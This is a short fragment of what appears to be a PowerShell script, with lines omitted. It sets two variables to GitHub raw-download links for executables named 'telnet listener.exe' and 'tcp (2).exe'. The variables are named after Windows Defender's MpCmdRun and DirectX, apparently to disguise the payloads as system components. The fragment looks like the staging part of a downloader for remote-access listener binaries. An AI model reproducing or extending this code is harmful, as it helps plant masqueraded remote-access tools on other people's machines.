...
$urlMpCmdRun = "https://github.com/XXS437/Private/blob/main/telnet%20listener.exe?raw=true"
...
$urlDirectX = "https://github.com/XXS437/M/raw/main/tcp%20(2).exe"  # Direct link to the raw file
